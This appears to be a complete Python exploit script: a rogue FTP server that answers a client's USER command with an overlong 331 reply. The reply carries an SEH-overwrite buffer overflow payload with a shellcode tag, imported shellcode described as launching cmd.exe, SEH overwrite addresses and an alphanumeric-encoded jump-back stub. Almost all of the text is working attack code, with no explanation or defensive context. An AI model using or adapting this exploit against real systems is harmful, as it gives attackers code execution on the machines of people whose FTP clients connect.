#!/usr/bin/python
from payload import buf
import socket

def shell_attack(target_machine, target_port):

    #ascii encoded launch cmd.exe
   

    #All the normal ways to jump back to code I control code were bad characters, so again had to ascii encode
    jmpback =  b""
    jmpback += b"\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    jmpback += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
    jmpback += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
    jmpback += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    jmpback += b"\x4e\x6d\x4d\x6e\x46\x70\x49\x6e\x6b\x4f\x4b\x4f\x49"
    jmpback += b"\x6f\x6a\x47\x41\x41"

    host = target_machine
    port = target_port

    sled=b"NjoyUrShell!"
    fill=b"\x41"*(480-len(buf))
    nseh=b"\x74\x06\x90\x90"
    seh=b"\xad\x11\x4d\x00"
    prepesi=b"\x58\x58\x58\x8d\x70\x10\x90\x90"
    jnk=b"B"*400
    sploit=(sled+buf+fill+nseh+seh+prepesi+jmpback+jnk)
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(1)


    
    
    connect, hostip = sock.accept()
   
    connect.send(b"220 Welcome to pwnServ, Serving sploit in 3..2..1..\r\n")
    connect.recv(64)  # Receive USER
    connect.send(b"331 "+sploit+b"\r\n")
    connect.close()
    sock.close()